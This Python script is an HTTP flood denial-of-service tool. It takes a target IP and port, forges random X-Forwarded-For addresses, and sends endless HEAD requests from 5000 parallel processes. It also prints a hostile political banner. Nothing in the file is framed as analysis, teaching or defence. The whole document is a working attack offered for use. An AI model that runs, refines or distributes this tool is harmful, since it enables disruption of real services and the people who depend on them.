import socket
import os
import sys
import time
import multiprocessing
import random
import fade 

NormalBlack = "\033[38;5;0m  \033[0m"
NormalRed = "\033[38;5;1m  \033[0m"
NormalGreen = "\033[38;5;2m  \033[0m"
NormalYellow = "\033[38;5;3m  \033[0m"
NormalBlue = "\033[38;5;4m  \033[0m"
NormalMagenta = "\033[38;5;5m  \033[0m"
NormalCyan = "\033[38;5;6m  \033[0m"
NormalWhite =  "\033[38;5;7m  \033[0m"
BrightBlack = "\033[48;5;0m  \033[0m"
BrightRed =  "\033[48;5;1m  \033[0m"
BrightGreen = "\033[48;5;2m  \033[0m"
BrightYellow = "\033[48;5;3m  \033[0m"
BrightBlue = "\033[48;5;4m  \033[0m"
BrightMagenta = "\033[48;5;5m  \033[0m"
BrightCyan = "\033[48;5;6m  \033[0m"
BrightWhite = "\033[48;5;7m  \033[0m"

attemps = 0
os.system('clear')
print("""
""")



ip = input("IP/Domain: ")
port = int(input("Port: "))
url = "http://" + str(ip)

def randomip():
  randip = []
  randip1 = random.randint(1,255)
  randip2 = random.randint(1,255)
  randip3 = random.randint(1,255)
  randip4 = random.randint(1,255)
  
  randip.append(randip1)
  randip.append(randip2)
  randip.append(randip3)
  randip.append(randip4)

  randip = str(randip[0]) + "." + str(randip[1]) + "." + str(randip[2]) + "." + str(randip[3])
  return(randip)


print("\033[48;5;5mFUCK 210N15T \033[32mand \033[38;5;7mFREE PALESTINE")


time.sleep(1)

def attack():
  connection = "Connection: null\r\n"
  referer = "Referer: null\r\n"
  forward = "X-Forwarded-For: " + randomip() + "\r\n"
  get_host = "HEAD " + url + " HTTP/1.1\r\nHost: " + ip + "\r\n"
  request = get_host + referer  + connection + forward + "\r\n\r\n"
  while True:
    try:
      atk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      atk.connect((ip, port))
      #star here
      for y in range(100):
          atk.send(str.encode(request))
          print("\033[48;5;4mStarting attack \033[0m \033[32m" +str(url)+ " \033[91m0nfire..!!\033[0m")

    except socket.error:
      time.sleep(.1)
    except:
      pass


def send2attack():
  for i in range(5000): #Magic Power
    mp = multiprocessing.Process(target=attack)
    mp.setDaemon = False
    mp.start() #Magic Starts

send2attack() #61 lines for the most powerful attack, cool?

            
